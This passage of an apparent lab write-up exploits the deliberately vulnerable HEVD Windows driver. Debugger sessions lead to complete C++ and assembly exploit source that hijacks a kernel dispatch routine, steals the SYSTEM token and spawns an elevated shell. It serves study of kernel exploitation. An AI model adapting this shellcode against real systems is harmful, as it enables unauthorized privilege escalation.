If we execute the exploit so far `WinDbg` should catch the breakpoint at the address we just leaked:

```
Break instruction exception - code 80000003 (first chance)
ffff980b`50b03000 cc              int     3
```

And after resuming execution... BSOD once again.
Next up we must figure out a way to guarantee process continuation, since it'd be pointless to escalate privileges for our process if we're going to crash the OS anyways.

### Process Continuation

To recap, we currently have the ability to execute arbitrary code within the context of the driver.
More specifically, we're inside of a dispatch routine, which we need to properly return from if we want to return to our userland process eventually.
This is the second problem that we need to solve before moving forward with our exploit.

[As per the documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/how-to-complete-an-irp-in-a-dispatch-routine), if we want to complete the IRP and go back to userland, we must set the `Irp->IoStatus`'s fields to zero (`Irp` being the second argument passed to the `DispatchDeviceControl` routine), call `IoCompleteRequest` and return zero from the callback (assuming we want to fake a succes status code).
One way we can achieve this is by returning from our shellcode to the end of the `DispatchDeviceControl` function, whose pseudo-code is:

```C++
[...]
LAB_140085717:
  *(undefined8 *)((longlong)Irp + 0x38) = 0;
  *(undefined4 *)((longlong)Irp + 0x30) = status;
  IofCompleteRequest(Irp,0);
  return status;
```

Whose assembly code reads:

```Assembly
                             LAB_140085717                                   XREF[2]:     14008509f(j), 1400855f1(j)  
       140085717 48 83 65        AND        qword ptr [RBP + 0x38],0x0
                 38 00
       14008571c 33 d2           XOR        EDX,EDX
       14008571e 48 8b cd        MOV        RCX,RBP
       140085721 89 75 30        MOV        dword ptr [RBP + 0x30],ESI
       140085724 ff 15 e6        CALL       qword ptr [->NTOSKRNL.EXE::IofCompleteRequest]   = 0008a576
                 c8 f7 ff
       14008572a 48 8b 5c        MOV        RBX,qword ptr [RSP + local_res8]
                 24 30
       14008572f 8b c6           MOV        EAX,ESI
       140085731 48 8b 74        MOV        RSI,qword ptr [RSP + local_res18]
                 24 40
       140085736 48 8b 6c        MOV        RBP,qword ptr [RSP + local_res10]
                 24 38
       14008573b 48 8b 7c        MOV        RDI,qword ptr [RSP + local_res20]
                 24 48
       140085740 48 83 c4 20     ADD        RSP,0x20
       140085744 41 5e           POP        R14
       140085746 c3              RET

```

As can be seen in the above snippet, this code is calling `IofCompleteRequest(rbp, 0)`, restoring the value of [non-volatile registers](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170#callercallee-saved-registers) and returning whatever is stored in `esi`.
This is useful for us, since in order to return from our shellcode we can increment `rsp` to point to the stack frame of this function, jump to this code, and allow the program to keep running.
There is a catch, though.
We don't know the location of this piece of code, and `rbp` must point to the `Irp` object.

Let's try break at the beginning of `DispatchDeviceControl` and at the beginning of our shellcode again, and see whether we can find the data we need to reconstruct a valid state:

```
Breakpoint 0 hit
HEVD+0x85074:
fffff804`20215074 488bc4          mov     rax,rsp
5: kd> r rdx
rdx=ffffaf85ac0da4a0
5: kd> t
HEVD+0x85077:
fffff804`20215077 48895808        mov     qword ptr [rax+8],rbx
5: kd> 
HEVD+0x8507b:
fffff804`2021507b 48896810        mov     qword ptr [rax+10h],rbp
5: kd> 
HEVD+0x8507f:
fffff804`2021507f 48897018        mov     qword ptr [rax+18h],rsi
5: kd> 
HEVD+0x85083:
fffff804`20215083 48897820        mov     qword ptr [rax+20h],rdi
5: kd> 
HEVD+0x85087:
fffff804`20215087 4156            push    r14
5: kd> 
HEVD+0x85089:
fffff804`20215089 4883ec20        sub     rsp,20h
5: kd> 
HEVD+0x8508d:
fffff804`2021508d 4c8bb2b8000000  mov     r14,qword ptr [rdx+0B8h]
5: kd> dq rsp La
ffffe98b`8a5b7780  00000000`00000010 00000000`00040344
ffffe98b`8a5b7790  ffffe98b`8a5b77a0 00000000`00000018
ffffe98b`8a5b77a0  00000000`00000001 fffff803`07a4a295
ffffe98b`8a5b77b0  00000000`00000002 ffffaf85`b1d050c0
ffffe98b`8a5b77c0  00000000`00000000 ffffaf85`ac0da4a0
5: kd> g
```

Ok, so `Irp` is stored at address `ffffaf85ac0da4a0`, and `rsp` points to `ffffe98b8a5b7780` throughout the function.
Let's see if we can retrieve this data from our buffer:

```
****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******
[+] UserBuffer: 0x000000910AD9EBF0
[+] UserBuffer Size: 0x828
[+] KernelBuffer: 0xFFFFE98B8A5B6F30
[+] KernelBuffer Size: 0x800
[+] Triggering Buffer Overflow in Stack
Break instruction exception - code 80000003 (first chance)
ffffaf85`a6903000 cc              int     3
5: kd> r
rax=0000000000000000 rbx=ffffaf85a6903000 rcx=ffffe98b8a5b7750
rdx=00001705807e7cc0 rsi=00000000c00000bb rdi=000000000000004d
rip=ffffaf85a6903000 rsp=ffffe98b8a5b7750 rbp=ffffaf85ac0da4a0
 r8=0000000000000008  r9=0000000000000000 r10=0000000000000000
r11=ffffe98b8a5b7730 r12=ffffaf85a6903000 r13=ffffaf85b0633ac0
r14=ffffaf85a6903000 r15=ffffaf85a6903000
iopl=0         nv up ei pl nz na pe nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040202
ffffaf85`a6903000 cc              int     3
5: kd> dq rsp La
ffffe98b`8a5b7750  ffffaf85`a6903000 00000000`c00000bb
ffffe98b`8a5b7760  00000000`0000004d 00000000`00040280
ffffe98b`8a5b7770  ffffe98b`8a5b7780 fffff804`2021524f
ffffe98b`8a5b7780  00000000`00000010 00000000`00040344
ffffe98b`8a5b7790  fffff804`202182f0 00000000`00222003
```

Good, the address of `Irp` is now stored in `rbp`, and the stack only points 0x30 bytes above the original location.
Besides, there is an address on the stack at address `rsp + 0x40` which we can use to locate the module, and resolve module addresses from there:

```
5: kd> u fffff804`202182f0
HEVD+0x882f0:
fffff804`202182f0 2a2a            sub     ch,byte ptr [rdx]
fffff804`202182f2 2a2a            sub     ch,byte ptr [rdx]
fffff804`202182f4 2a2a            sub     ch,byte ptr [rdx]
fffff804`202182f6 204845          and     byte ptr [rax+45h],cl
fffff804`202182f9 56              push    rsi
fffff804`202182fa 445f            pop     rdi
fffff804`202182fc 49              ???
fffff804`202182fd 4f              ???
```
So if we update the shellcode to include:

```Assembly
kernel_shellcode PROC
	int 3
	
	; Set up an ordinary stack frame
	push rbp
	mov rbp, rsp
	sub rsp, 20h
	
	; [priv. esc. will happen here]

	; set status code
	xor esi, esi

	; null out rax, just in case
	xor eax, eax

	; restore old rbp
	leave

	; calculate address of return address
	mov rcx, [rsp + 40h]
	sub rcx, 882f0h
	lea rcx, [rcx + 85717h]
	; skip previous stack frame
	lea rsp, [rsp + 30h]

	; jump to clean-up
	jmp rcx
kernel_shellcode ENDP
```

We should be able to execute arbitrary code within the driver, and then return to userland normally:

```
5: kd> t
ffffaf85`a6903001 55              push    rbp
5: kd> t
ffffaf85`a6903002 488bec          mov     rbp,rsp
4: kd> t
ffffaf85`a6903005 4883ec20        sub     rsp,20h
4: kd> t
ffffaf85`a6903009 33f6            xor     esi,esi
4: kd> t
ffffaf85`a690300b 33c0            xor     eax,eax
4: kd> t
ffffaf85`a690300d c9              leave
4: kd> t
ffffaf85`a690300e 488b4c2440      mov     rcx,qword ptr [rsp+40h]
4: kd> t
ffffaf85`a6903013 4881e9f0820800  sub     rcx,882F0h
4: kd> t
ffffaf85`a690301a 488d8917570800  lea     rcx,[rcx+85717h]
4: kd> t
ffffaf85`a6903021 488d642430      lea     rsp,[rsp+30h]
4: kd> t
ffffaf85`a6903026 ffe1            jmp     rcx
4: kd> t
HEVD+0x85717:
fffff804`20215717 4883653800      and     qword ptr [rbp+38h],0
4: kd> u rip
HEVD+0x85717:
fffff804`20215717 4883653800      and     qword ptr [rbp+38h],0
fffff804`2021571c 33d2            xor     edx,edx
fffff804`2021571e 488bcd          mov     rcx,rbp
fffff804`20215721 897530          mov     dword ptr [rbp+30h],esi
fffff804`20215724 ff15e6c8f7ff    call    qword ptr [HEVD+0x2010 (fffff804`20192010)]
fffff804`2021572a 488b5c2430      mov     rbx,qword ptr [rsp+30h]
fffff804`2021572f 8bc6            mov     eax,esi
fffff804`20215731 488b742440      mov     rsi,qword ptr [rsp+40h]
4: kd> g
```

After which the VM is still running and no BSOD occurs.
Good, now all we need to do is to escalate privileges before continuing the process.

### Kernel Payload

Privilege escalation can be achieved by replacing the current process' [access token](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens) with the access token of a system process.
As described [in this great OST2 Windows Kernel Internals course module](https://apps.p.ost2.fyi/learning/course/course-v1:OpenSecurityTraining2+Arch2821_Windows_Kernel_Internals_2+2023_v1/block-v1:OpenSecurityTraining2+Arch2821_Windows_Kernel_Internals_2+2023_v1+type@sequential+block@4bfca5f24b0a4be49690fd26eceac06d/block-v1:OpenSecurityTraining2+Arch2821_Windows_Kernel_Internals_2+2023_v1+type@vertical+block@e23784cdc5124c1091bf9d856255614a), this can be done by copying the field `TOKEN` field within the [`EPROCESS` struct](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess#eprocess) of a system process to our own.
Now, this technique (known as token stealing) seems to be fairly common and easily detectable by AVs/EDRs, but for the purposes of this challenge this will be good enough (a more involved approach would, for instance, consist of just patching security identifiers within our own token).

The only problem is that we don't really have the address of any [`EPROCESS` struct](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess#eprocess).
This is needed, since that's the structure which holds the access token for a given process.
Strictly speaking, we only need the address of _any_ `EPROCESS`, since they are linked together and we could, in principle, find our process and the system process by traversing this linked list.

The thing with this approach is that the memory layout of the `EPROCESS` structure varies across Windows versions, and depending too heavily on hard-coded offsets would make our exploit harder to port.
The same applies to offsets within the Windows kernel.
We would like, as much as possible, to avoid relying on anything that could vary in a different version of the OS.

The `ntoskrns.exe` library (which the HEVD driver is linked against) exports two handy symbols: [`PsGetCurrentProcess`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iogetcurrentprocess) and [`PsInitialSystemProcess`](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/mm64bitphysicaladdress).
If we can find the address of this library, we could [traverse its `_IAMGE_EXPORT_DIRECTORY`](https://ferreirasc.github.io/PE-Export-Address-Table/) (whose address can be found within the `_IMAGE_OPTIONAL_HEADER64` struct near the beginning of the module) in order to find the address for the two symbols without compromising on portability.

One way to find the base address of the kernel, we could look at the IAT within the HEVD driver, look for a random function from `ntoskrnl.exe`, and start walking backwards until we find a PE signature at the beginning of a page.
However, this method could be error prone due to false positives or potential access violations.
A more direct method which doesn't involve walking through memory or using hard-coded offsets is [shown here](https://www.unknowncheats.me/forum/general-programming-and-reversing/427419-getkernelbase.html).
It consists of using the `DriverSection` field within our `DRIVER_OBJECT` (which can be obtained from the `Irp` pointer that we have access to), which should point to a `_KLDR_DATA_TABLE_ENTRY` structure (i.e., the kernel equivalent to `_LDR_DATA_TABLE_ENTRY`) and looking for the kernel there.

The definition of `_KLDR_DATA_TABLE_ENTRY` is as follows:

```
nt!_KLDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY
   +0x010 ExceptionTable   : Ptr64 Void
   +0x018 ExceptionTableSize : Uint4B
   +0x020 GpValue          : Ptr64 Void
   +0x028 NonPagedDebugInfo : Ptr64 _NON_PAGED_DEBUG_INFO
   +0x030 DllBase          : Ptr64 Void
   +0x038 EntryPoint       : Ptr64 Void
   +0x040 SizeOfImage      : Uint4B
   +0x048 FullDllName      : _UNICODE_STRING
   +0x058 BaseDllName      : _UNICODE_STRING
   +0x068 Flags            : Uint4B
   +0x06c LoadCount        : Uint2B
   +0x06e u1               : <anonymous-tag>
   +0x070 SectionPointer   : Ptr64 Void
   +0x078 CheckSum         : Uint4B
   +0x07c CoverageSectionSize : Uint4B
   +0x080 CoverageSection  : Ptr64 Void
   +0x088 LoadedImports    : Ptr64 Void
   +0x090 Spare            : Ptr64 Void
   +0x098 SizeOfImageNotRounded : Uint4B
   +0x09c TimeDateStamp    : Uint4B
```

From here, we only care about `InLoadOrderLinks` to traverse the list and `BaseDllName` to identify libraries.

In our shellcode, we can now make use of the `Irp` pointer to retrieve the `_DEVICE_OBJECT` pointer, and from it, the `DriverSection` field:


```Assembly
	; Get address of ntoskrnl.exe
	;   Get _KLDR_DATA_TABLE_ENTRY
	mov rax, [rbp]                      ; Irp
	mov rax, [rax + 0b8h]               ; Irp->CurrentStackLocation
	mov rax, [rax + 28h]                ; CurrentStackLocation->DeviceObject
	mov rax, [rax + 08h]                ; DeviceObject->DriverObject
	mov rax, [rax + 28h]                ; DriverObject->DriverSection  (DriverSection has type _KLDR_DATA_TABLE_ENTRY)
	
	;   Cycle through modules until we find ntoskrnl.exe
cycle_modules:
	mov rax, [rax]
	mov cx, [rax + 58h]                 ; KldrDataTablEntry->BaseDllName.Length
	cmp cx, 18h
	jne cycle_modules
	mov rcx, [rax + 58h + 8h]           ; KldrDataTablEntry->BaseDllName.Buffer
	mov r8, 0073006f0074006eh           ; U"ntos"
	cmp [rcx], r8
	jne cycle_modules
	
	mov rax, [rax+30h]                  ; KldrDataTablEntry->DllBase
	mov [rbp - 08h], rax

	; Get address of PsGetCurrentProcess
	call skip_PsGetCurrentProcess
	db "PsGetCurrentProcess", 0
skip_PsGetCurrentProcess:
	mov rdx, [rsp]
	mov rcx, [rbp - 08h]
	call kernel_shellcode_find_module_func
	add rsp, 08h
	mov [rbp - 10h], rax

	; Get address of PsInitialSystemProcess
	call PsInitialSystemProcess
	db "PsInitialSystemProcess", 0
PsInitialSystemProcess:
	mov rdx, [rsp]
	mov rcx, [rbp - 08h]
	call kernel_shellcode_find_module_func
	add rsp, 08h
	mov [rbp - 18h], rax

	; Call PsGetCurrentProcess
	mov rcx, [rbp - 10h]
	xor eax, eax
	call rcx
```

The `kernel_shellcode_find_module_func` function is fairly long so it's omitted here for brevity, and will be included in the full exploit code below.
All it does is traverse the export directory of the given module looking for a given symbol.

> The portability of this method is debatable.
Although it's not relying on hard-coded offsets, we have no guarantee that `DriverSection` points to an instance of `_KLDR_DATA_TABLE_ENTRY` (since this isn't stated anywhere on [the documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object)).
Besides, the `_KLDR_DATA_TABLE_ENTRY` is also not documented and may vary accross versions.
However, due to the simplicity of the `_KLDR_DATA_TABLE_ENTRY` structure (as opposed to `EPROCESS`), the offsets we are relying on with this method are less likely to vary over time.

Now that we have both the system and current processes, we're ready to steal the token.
There's no getting around hard-coded offsets now, as we need to modify a member of the `EPROCESS` instance (if portability was a concern, we could implement a table mapping OS version numbers to offsets instead of hard-coding it in the code).

Let's look at the definition of this structure in this OS version:

```
6: kd> dt _EPROCESS
ntdll!_EPROCESS
[...]
   +0x4b8 Token            : _EX_FAST_REF
   +0x4c0 MmReserved       : Uint8B
[...]
```

So the token is stored at offset 0x4b8, and is eight bytes long.
We can simply copy the token from one process to the next within a few instructions:

```Assembly
[...]
	; PEPROCESS for current process is stored in rax since we just called PsGetCurrentProcess

	; Get System PEPROCESS pointer
	mov rcx, [rbp - 18h]
	; Get System PEPROCESS
	mov rcx, [rcx]
	; Get System EPROCESS token
	mov rcx, [rcx + 4b8h]
	; Overload current EPROCESS token
	mov [rax + 4b8h], rcx
[...]
```

By this point, we should have successfully elevated privileges, and after cleanly returning to userspace, our process should have administrator privileges and should be able to spawn an administrator shell.
Let's try running the exploit (after some polishing):

```
Running whoami (should return non-privileged user)...
desktop-kgoa5ue\hevd
Done!
Opening device driver... Done! Device driver handle is 00000000000000D8
Leaking non-paged pool memory address... Done! Non paged pool at FFFFAF85A6903000
Writing 433 bytes of shellcode to non-paged pool... Done!
Triggering overflow and hijacking control flow... Done!
Closing driver handle... Done!
Running whoami (should return system user)...
nt authority\system
Done!
Spawning elevated shell...
Microsoft Windows [Version 10.0.19045.5247]
(c) Microsoft Corporation. All rights reserved.

C:\Users\hevd\source\repos\HEVDExploit\HEVDExploit>whoami
nt authority\system

C:\Users\hevd\source\repos\HEVDExploit\HEVDExploit>exit
Done!

C:\Users\hevd\source\repos\HEVDExploit\x64\Debug\HEVDExploit.exe (process 10808) exited with code 0 (0x0).
```

Which means it worked, and we successfully escalated privileges!

### Putting It All Together

For reference, we include the full code for the above exploit.

Contents of the `main.cpp` file:

```C++
#include "Windows.h"

#include <cstdio>
#include <cstdint>
#include <cstdlib>

extern "C" {
    extern uint8_t* get_kernel_shellcode_address(void);
    extern uint32_t get_kernel_shellcode_size(void);
};

int main()
{
    printf("Running whoami (should return non-privileged user)...\n");
    system("whoami");
    printf("Done!\n");

    printf("Opening device driver... ");

    HANDLE hevdDevice = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",    // lpFileName
        FILE_SHARE_READ | FILE_SHARE_WRITE,         // dwDesiredAccess
        0,                                          // dwShareMode
        NULL,                                       // lpSecurityAttributes
        OPEN_EXISTING,                              // dwCreationDisposition
        0,                                          // dwFlagsAndAttributes
        NULL                                        // hTemplateFile
    );

    if (hevdDevice == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error opening device!\n");
        return -1;
    }

    printf("Done! Device driver handle is %p\n", hevdDevice);

    uint8_t* non_paged_pool = 0x0;
    
    {
        const uint32_t IOCTL_MEM_DISCLOSURE = 0x22203f;
        const uint32_t buffer_size = 0x400;
        uint8_t buffer[buffer_size];

        printf("Leaking non-paged pool memory address... ");

        DeviceIoControl(
            hevdDevice,
            IOCTL_MEM_DISCLOSURE,
            NULL,
            0,
            buffer,
            buffer_size,
            NULL,
            NULL
        );

        uint8_t* leak_address = *(uint8_t**)((uint64_t)buffer + 0x210);
        non_paged_pool = (uint8_t*)((uint64_t)leak_address & (uint64_t)0xfffffffffffff000);

        printf("Done! Non paged pool at %p\n", non_paged_pool);
    }

    {
        const uint32_t IOCTL_WRITE_WHAT_WHERE = 0x22200b;
        uint8_t* kernel_shellcode = get_kernel_shellcode_address();
        uint32_t kernel_shellcode_size = get_kernel_shellcode_size();

        printf("Writing %u bytes of shellcode to non-paged pool... ", kernel_shellcode_size);

        for (uint32_t i = 0; i < kernel_shellcode_size; i+=8) {
            uint64_t write_what_where[2] = {
                (uint64_t)kernel_shellcode + i,
                (uint64_t)non_paged_pool + i,
            };

            DeviceIoControl(
                hevdDevice,
                IOCTL_WRITE_WHAT_WHERE,
                write_what_where,
                0x10,
                NULL,
                0,
                NULL,
                NULL
            );
        }

        printf("Done!\n");
    }

    {
        const uint32_t IOCTL_STACK_OVERFLOW = 0x222003;
        const uint32_t buffer_size = 0x828;
        uint8_t buffer[buffer_size];

        for (uint32_t i = 0; i < buffer_size; i+=8) {
            *(uint64_t*)((uint64_t)buffer + i) = (uint64_t)non_paged_pool;
        }

        printf("Triggering overflow and hijacking control flow... ");

        DeviceIoControl(
            hevdDevice,
            IOCTL_STACK_OVERFLOW,
            buffer,
            buffer_size,
            NULL,
            0,
            NULL,
            NULL
        );

        printf("Done!\n");
    }

    printf("Closing driver handle... ");
    CloseHandle(hevdDevice);
    printf("Done!\n");

    printf("Running whoami (should return system user)...\n");
    system("whoami");
    printf("Done!\n");


    printf("Spawning elevated shell...\n");
    system("cmd.exe");
    printf("Done!\n");

    return 0;
}
```

Contents of the `shellcode.asm` file:

```Assembly
PUBLIC kernel_shellcode
PUBLIC get_kernel_shellcode_address
PUBLIC get_kernel_shellcode_size

.code

kernel_shellcode_start PROC
kernel_shellcode_start ENDP

kernel_shellcode PROC
	push rbp
	mov rbp, rsp
	sub rsp, 20h

	; Get address of ntoskrnl.exe
	;   Get _KLDR_DATA_TABLE_ENTRY
	mov rax, [rbp]                      ; Irp
	mov rax, [rax + 0b8h]               ; Irp->CurrentStackLocation
	mov rax, [rax + 28h]                ; CurrentStackLocation->DeviceObject
	mov rax, [rax + 08h]                ; DeviceObject->DriverObject
	mov rax, [rax + 28h]                ; DriverObject->DriverSection  (DriverSection has type _KLDR_DATA_TABLE_ENTRY)
	
	;   Cycle through modules until we find ntoskrnl.exe
cycle_modules:
	mov rax, [rax]
	mov cx, [rax + 58h]                 ; KldrDataTablEntry->BaseDllName.Length
	cmp cx, 18h
	jne cycle_modules
	mov rcx, [rax + 58h + 8h]           ; KldrDataTablEntry->BaseDllName.Buffer
	mov r8, 0073006f0074006eh           ; U"ntos"
	cmp [rcx], r8
	jne cycle_modules
	
	mov rax, [rax+30h]                  ; KldrDataTablEntry->DllBase
	mov [rbp - 08h], rax

	; Get address of PsGetCurrentProcess
	call skip_PsGetCurrentProcess
	db "PsGetCurrentProcess", 0
skip_PsGetCurrentProcess:
	mov rdx, [rsp]
	mov rcx, [rbp - 08h]
	call kernel_shellcode_find_module_func
	add rsp, 08h
	mov [rbp - 10h], rax

	; Get address of PsInitialSystemProcess
	call PsInitialSystemProcess
	db "PsInitialSystemProcess", 0
PsInitialSystemProcess:
	mov rdx, [rsp]
	mov rcx, [rbp - 08h]
	call kernel_shellcode_find_module_func
	add rsp, 08h
	mov [rbp - 18h], rax

	; Call PsGetCurrentProcess
	mov rcx, [rbp - 10h]
	xor eax, eax
	call rcx

	; Get System PEPROCESS pointer
	mov rcx, [rbp - 18h]
	; Get System PEPROCESS
	mov rcx, [rcx]
	; Get System EPROCESS token
	mov rcx, [rcx + 4b8h]
	; Overload current EPROCESS token
	mov [rax + 4b8h], rcx

	; set status code
	xor esi, esi

	; null out rax, just in case
	xor eax, eax

	; restore old rbp
	leave

	; calculate address of return address
	mov rcx, [rsp + 40h]
	sub rcx, 882f0h
	lea rcx, [rcx + 85717h]
	; skip previous stack frame
	lea rsp, [rsp + 30h]

	; jump to clean-up
	jmp rcx
kernel_shellcode ENDP

; void *kernel_shellcode_find_module_func(void *module, char *func_name)
kernel_shellcode_find_module_func PROC
	push rbp
	mov rbp, rsp
	sub rsp, 20h

	mov [rbp - 08h], rcx                ; store module
	mov [rbp - 10h], rdx                ; store func_name

	mov rax, rcx
	xor rcx, rcx
	mov ecx, [rax + 3ch]                ; ImageDosHeader->e_lfanew
	mov ecx, [rax + rcx + 88h]          ; ImagePeHeaders64->OptionalHeader.DataDirectory[0]
	add rcx, rax                        ; VA of _IMAGE_EXPORT_DIRECTORY
	mov [rbp - 18h], rcx                ; store VA of IED

	xor rcx, rcx
	mov [rbp - 20h], rcx

cycle_functions:
	mov rax, [rbp - 18h]                ; VA of IED
	xor rdx, rdx
	mov edx, [rax + 20h]                ; RVA of AddressOfNames
	mov rax, [rbp - 08h]                ; module
	add rdx, rax                        ; VA of AddressOfNames
	mov rcx, [rbp - 20h]                ; i
	lea rdx, [rdx + rcx * 4]            ; Address of RVA of ith name
	xor rcx, rcx
	mov ecx, [rdx]                      ; RVA of ith name
	add rcx, rax ; VA of ith name
	mov rdx, [rbp - 10h]                ; func_name
	call kernel_shellcode_memcpy
	je found
	mov rcx, [rbp - 20h] ; i
	inc rcx
	mov [rbp - 20h], rcx
	jmp cycle_functions

found:
	mov rax, [rbp - 18h]                ; VA of IED
	xor rdx, rdx
	mov edx, [rax + 24h]                ; RVA of AddressOfNameOrdinals
	mov rax, [rbp - 08h]                ; module
	add rdx, rax                        ; VA of AddressOfNameOrdinals
	mov rax, [rbp - 20h] ; i
	lea rdx, [rdx + rax * 2]            ; VA of i-th AddressOfNameOrdinals
	xor rcx, rcx
	mov cx, [rdx]                       ; i-th AddressOfNameOrdinals

	mov rax, [rbp - 18h]                ; VA of IED
	xor rdx, rdx
	mov edx, [rax + 1ch]                ; RVA of AddressOfFunctions
	mov rax, [rbp - 08h]                ; module
	add rdx, rax                        ; VA of AddressOfFunctions
	sal rcx, 2                          ; offset of ordinal
	add rdx, rcx                        ; VA of target AddressOfFunctions
	xor rcx, rcx
	mov ecx, [rdx]                      ; target AddressOfFunctions
	add rax, rcx                        ; VA of target function

	leave
	ret
kernel_shellcode_find_module_func ENDP

; int kernel_shellcode_memcpy (char *str1, char *str2)
kernel_shellcode_memcpy PROC
	push rbp
	mov rbp, rsp

iter:
	mov al, [rdx]
	cmp al, [rcx]
	jne not_equal
	xor al, al
	cmp al, [rdx]
	je equal
	inc rdx
	inc rcx
	jmp iter

equal: 
	xor rax, rax
	jmp finish
not_equal:
	xor rax, rax
	inc rax
	jmp finish

finish:
	leave
	ret
kernel_shellcode_memcpy ENDP

kernel_shellcode_end PROC
kernel_shellcode_end ENDP

get_kernel_shellcode_address PROC
	mov rax, kernel_shellcode_start
	ret
get_kernel_shellcode_address ENDP

get_kernel_shellcode_size PROC
	call get_kernel_shellcode_address
	mov rcx, rax
	mov rax, kernel_shellcode_end
	sub rax, rcx
	ret
get_kernel_shellcode_size ENDP

END
```
